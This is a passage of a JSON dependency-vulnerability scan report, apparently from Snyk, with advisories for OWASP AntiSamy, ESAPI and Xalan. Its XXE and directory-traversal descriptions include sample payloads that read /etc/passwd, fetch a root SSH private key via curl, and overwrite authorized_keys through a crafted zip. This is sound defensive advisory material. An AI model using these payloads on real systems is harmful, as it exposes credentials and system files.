      "description": "## Overview\n[org.owasp.antisamy:antisamy](https://mvnrepository.com/artifact/org.owasp.antisamy/antisamy) is a library for performing fast, configurable cleansing of HTML coming from untrusted sources.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via `<style>` tag in `MagixSAXFilter.java`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.antisamy:antisamy` to version 1.5.5 or higher.\n## References\n- [GitHub Commit](https://github.com/nahsra/antisamy/commit/7313931dc3c0d1377b010f07faef2063dd359a36#commitcomment-41485849)\n- [GitHub Issue](https://github.com/nahsra/antisamy/issues/2)\n",
      "epssDetails": {
        "percentile": "0.48930",
        "probability": "0.00142",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2016-10006"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.owasp.antisamy:antisamy",
      "proprietary": false,
      "creationTime": "2020-08-16T11:47:59.089849Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-08-15T07:20:22Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.antisamy",
        "artifactId": "antisamy"
      },
      "publicationTime": "2020-08-16T12:11:43Z",
      "modificationTime": "2022-01-03T17:41:49.097888Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0",
        "org.owasp.antisamy:antisamy@1.5.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.antisamy:antisamy",
      "version": "1.4.3"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPESAPI-1088594",
      "title": "XML External Entity (XXE) Injection",
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N",
      "credit": [
        "Dave Wichers"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.2.3.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.2.3.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "low",
      "cvssScore": 3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.esapi:esapi",
      "references": [
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/issues/614%23issuecomment-805395354",
          "title": "GitHub Issue"
        },
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/pull/612",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via alteration of local ESAPI configuration and loading XML version of the ESAPI properties file.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.2.3.0 or higher.\n## References\n- [GitHub Issue](https://github.com/ESAPI/esapi-java-legacy/issues/614#issuecomment-805395354)\n- [GitHub PR](https://github.com/ESAPI/esapi-java-legacy/pull/612)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-611"
        ]
      },
      "packageName": "org.owasp.esapi:esapi",
      "proprietary": false,
      "creationTime": "2021-03-24T15:58:12.878109Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-03-24T01:09:28Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.esapi",
        "artifactId": "esapi"
      },
      "publicationTime": "2021-03-26T18:51:22Z",
      "modificationTime": "2021-04-11T14:14:20.450803Z",
      "socialTrendAlert": false,
      "severityWithCritical": "low",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.3.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.esapi:esapi",
      "version": "2.1.0"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPESAPI-2803305",
      "title": "Directory Traversal",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Jaroslav Lobacevski"
      ],
      "semver": {
        "vulnerable": [
          "[,2.3.0.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.3.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.esapi:esapi",
      "references": [
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/commit/a0d67b75593878b1b6e39e2acc1773b3effedb2a",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/releases/tag/esapi-2.3.0.0",
          "title": "GitHub Release"
        },
        {
          "url": "https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/",
          "title": "GitHub Security Labs"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:22.688282Z"
        }
      ],
      "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to Directory Traversal via the default implementation of the `Validator.getValidDirectoryPath(String, String, File, boolean)`, which may incorrectly treat the tested input string as a child of the specified parent directory. This potentially could allow control-flow bypass checks to be defeated if an attack can specify the entire string representing the 'input' path. \r\n\r\n\r\n**Note:**\r\n As a workaround, it is possible to write one's own implementation of the Validator interface by sub-classing a version of the affected `DefaultValidator` class and then overriding the affected `getValidDirectoryPath()` to correct the issue. **However, the maintainers do not recommend this.**\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.3.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/ESAPI/esapi-java-legacy/commit/a0d67b75593878b1b6e39e2acc1773b3effedb2a)\n- [GitHub Release](https://github.com/ESAPI/esapi-java-legacy/releases/tag/esapi-2.3.0.0)\n- [GitHub Security Labs](https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/)\n",
      "epssDetails": {
        "percentile": "0.46572",
        "probability": "0.00129",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23457"
        ],
        "CWE": [
          "CWE-22"
        ],
        "GHSA": [
          "GHSA-8m5h-hrqm-pxm2"
        ],
        "GHSL": [
          "GHSL-2022-008"
        ]
      },
      "packageName": "org.owasp.esapi:esapi",
      "proprietary": false,
      "creationTime": "2022-04-26T08:29:58.339361Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-26T08:17:32Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.esapi",
        "artifactId": "esapi"
      },
      "publicationTime": "2022-04-26T13:43:06.046915Z",
      "modificationTime": "2022-07-26T01:11:22.688282Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.esapi:esapi",
      "version": "2.1.0"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPESAPI-2805301",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
      "credit": [
        "Matt Seil",
        "Kevin W. Wall",
        "serendipity",
        "Sebastian Passaro"
      ],
      "semver": {
        "vulnerable": [
          "[,2.3.0.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.3.0.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.esapi:esapi",
      "references": [
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin8.pdf",
          "title": "ESAPI Security Report"
        },
        {
          "url": "https://github.com/ESAPI/esapi-java-legacy/commit/9473bf4676d2b28fee93ee059099a4f4e707dc51",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-07-26T01:11:20.781319Z"
        }
      ],
      "description": "## Overview\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `Validator.getValidSafeHTML()` and `Validator.isValidSafeHTML()` methods. An incorrect regular expression for `onsiteURL` in the `antisamy-esapi.xml` configuration file can cause URLs with the `javascript:` scheme to not be sanitized.\r\n\r\n## Workaround\r\nManually edit your `antisamy-esapi.xml` configuration files to change the `onsiteURL` regular expression to:<br>\r\n\r\n`<regexp name=\"onsiteURL\" value=\"^(?!//)(?![\\p{L}\\p{N}\\\\\\.\\#@\\$%\\+&amp;;\\-_~,\\?=/!]*(&amp;colon))[\\p{L}\\p{N}\\\\\\.\\#@\\$%\\+&amp;;\\-_~,\\?=/!]*\"/>`\r\n\r\nAs a precaution, also change `offsiteURL` and `htmlTitle`:<br><br>\r\n`<regexp name=\"htmlTitle\" value=\"[\\p{L}\\p{N}\\s\\-_',:\\[\\]!\\./\\\\\\(\\)&amp[;]*\"/>`\r\n\r\n`<regexp name=\"offsiteURL\" value=\"(\\s)*((ht|f)tp(s?)://|maiolto:)[\\p{L}\\p{N}]+[\\p{L}\\p{N}\\p{Zs}\\.\\#@\\$%\\+&amp;;:\\-_~,\\?=/!\\(\\)]*(\\s)*\"/>`\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.owasp.esapi:esapi` to version 2.3.0.0 or higher.\n## References\n- [ESAPI Security Report](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin8.pdf)\n- [GitHub Commit](https://github.com/ESAPI/esapi-java-legacy/commit/9473bf4676d2b28fee93ee059099a4f4e707dc51)\n",
      "epssDetails": {
        "percentile": "0.37140",
        "probability": "0.00090",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-24891"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-q77q-vx4q-xx6q"
        ]
      },
      "packageName": "org.owasp.esapi:esapi",
      "proprietary": false,
      "creationTime": "2022-04-28T07:28:51.887443Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-27T21:09:46Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.esapi",
        "artifactId": "esapi"
      },
      "publicationTime": "2022-04-28T12:04:49.153221Z",
      "modificationTime": "2022-07-26T01:11:20.781319Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.3.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.esapi:esapi",
      "version": "2.1.0"
    },
    {
      "id": "SNYK-JAVA-ORGOWASPESAPI-30143",
      "title": "MAC validation Bypass",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.1.0.1)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.1.0.1"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.owasp.esapi:esapi",
      "references": [
        {
          "url": "http://off-the-wall-security.blogspot.ca/2014/03/esapi-no-longer-owasp-flagship-project.html",
          "title": "Kevin W. Wall Blog"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5960",
          "title": "NVD"
        },
        {
          "url": "http://www.synacktiv.com/ressources/synacktiv_owasp_esapi_hmac_bypass.pdf",
          "title": "Synacktiv Vulnerability Description"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 5.4,
          "modificationTime": "2023-02-09T11:24:15.465373Z"
        }
      ],
      "description": "## Overview\n\n[org.owasp.esapi:esapi](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API) is an OWASP project to create simple strong security controls for every web platform.\n\n\nAffected versions of this package are vulnerable to MAC validation Bypass.\nThe library does not properly resist tampering with serialized ciphertext, which makes it easier for remote attackers to bypass intended cryptographic protection mechanisms via an attack against the intended cipher mode in a non-default configuration, a different vulnerability than CVE-2013-5679.\n\n## Remediation\n\nUpgrade `org.owasp.esapi:esapi` to version 2.1.0.1 or higher.\n\n\n## References\n\n- [Kevin W. Wall Blog](http://off-the-wall-security.blogspot.ca/2014/03/esapi-no-longer-owasp-flagship-project.html)\n\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5960)\n\n- [Synacktiv Vulnerability Description](http://www.synacktiv.com/ressources/synacktiv_owasp_esapi_hmac_bypass.pdf)\n",
      "epssDetails": {
        "percentile": "0.66160",
        "probability": "0.00316",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2013-5960"
        ],
        "CWE": [
          "CWE-310"
        ]
      },
      "packageName": "org.owasp.esapi:esapi",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:50Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2013-09-30T17:09:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.owasp.esapi",
        "artifactId": "esapi"
      },
      "publicationTime": "2016-12-25T16:51:50Z",
      "modificationTime": "2023-02-09T11:24:15.465373Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.1.0.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.owasp.esapi:esapi",
      "version": "2.1.0"
    },
    {
      "id": "SNYK-JAVA-XALAN-2953385",
      "title": "Arbitrary Code Execution",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Felix Wilhelm"
      ],
      "semver": {
        "vulnerable": [
          "[0,2.7.3)"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.7.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "critical",
      "cvssScore": 9.8,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xalan:xalan",
      "references": [
        {
          "url": "https://lists.apache.org/thread/12pxy4phsry6c34x2ol4fft6xlho4kyw",
          "title": "Apache Advisory"
        },
        {
          "url": "https://lists.apache.org/thread/2qvl7r43wb4t8p9dd9om1bnkssk07sn8",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://www.openwall.com/lists/oss-security/2022/07/20/2",
          "title": "OSS Security Advisory"
        },
        {
          "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=2290",
          "title": "PoC"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-09-01T19:48:16.003470Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-11-08T01:10:42.468009Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-11-23T11:05:40.178239Z"
        }
      ],
      "description": "## Overview\n[xalan:xalan](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22xalan%22) is a XSLT processor for transforming XML documents into HTML, text, or other XML document types. It implements XSL Transformations (XSLT) Version 1.0 and XML Path Language (XPath) Version 1.0 and can be used from the command line, in an applet or a servlet, or as a module in other program.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution when processing malicious XSLT stylesheets, due to an integer truncation issue. This allows attackers to corrupt Java class files generated by the internal XSLTC compiler and execute arbitrary Java bytecode. \r\n\r\n**NOTE:** Fixed releases are not expected for the Apache Xalan project, which is being retired.\n## Remediation\nUpgrade `xalan:xalan` to version 2.7.3 or higher.\n## References\n- [Apache Advisory](https://lists.apache.org/thread/12pxy4phsry6c34x2ol4fft6xlho4kyw)\n- [Apache Mailing List](https://lists.apache.org/thread/2qvl7r43wb4t8p9dd9om1bnkssk07sn8)\n- [OSS Security Advisory](https://www.openwall.com/lists/oss-security/2022/07/20/2)\n- [PoC](https://bugs.chromium.org/p/project-zero/issues/detail?id=2290)\n",
      "epssDetails": {
        "percentile": "0.34727",
        "probability": "0.00085",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-34169"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "xalan:xalan",
      "proprietary": false,
      "creationTime": "2022-07-20T10:09:21.549799Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-07-20T08:11:19Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xalan",
        "artifactId": "xalan"
      },
      "publicationTime": "2022-07-20T11:39:26Z",
      "modificationTime": "2023-05-07T10:47:20.653154Z",
      "socialTrendAlert": false,
      "severityWithCritical": "critical",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "xom:xom@1.2.5",
        "xalan:xalan@2.7.0"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.2.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xalan:xalan",
      "version": "2.7.0"
    },
    {
      "id": "SNYK-JAVA-XALAN-31385",
      "title": "Arbitrary Class Load",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.7.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.7.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.3,
      "functions": [
        {
          "version": [
            "[,2.7.2)"
          ],
          "functionId": {
            "filePath": "org/apache/xalan/processor/XSLTElementProcessor.java",
            "className": "XSLTElementProcessor",
            "functionName": "setPropertiesFromAttributes"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xalan:xalan",
      "references": [
        {
          "url": "https://issues.apache.org/jira/browse/XALANJ-2435",
          "title": "Apache Jira Ticket"
        },
        {
          "url": "https://github.com/apache/xalan-j/commit/cbfd906cc5a1f1566fa1a98400c82e56077fae0c",
          "title": "GitHub Commit"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0107",
          "title": "NVD"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1080248",
          "title": "RedHat Bugzilla Bug"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:23:39.754729Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 6.3,
          "modificationTime": "2023-02-09T11:24:59.186020Z"
        }
      ],
      "description": "## Overview\n[xalan:xalan](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22xalan%22) is a XSLT processor for transforming XML documents into HTML, text, or other XML document types. It implements XSL Transformations (XSLT) Version 1.0 and XML Path Language (XPath) Version 1.0 and can be used from the command line, in an applet or a servlet, or as a module in other program.\n\nAffected versions of this package are vulnerable to Arbitrary Class Load. The TransformerFactory in does not properly restrict access to certain properties when FEATURE_SECURE_PROCESSING is enabled, which allows remote attackers to bypass expected restrictions and load arbitrary classes or access external resources via a crafted  `xalan:content-header`, `xalan:entities`,  `xslt:content-header`,  `xslt:entities` property, or a Java property that is bound to the XSLT 1.0 system-property function.\n## Remediation\nUpgrade `xalan:xalan` to version 2.7.2 or higher.\n## References\n- [Apache Jira Ticket](https://issues.apache.org/jira/browse/XALANJ-2435)\n- [GitHub Commit](https://github.com/apache/xalan-j/commit/cbfd906cc5a1f1566fa1a98400c82e56077fae0c)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0107)\n- [RedHat Bugzilla 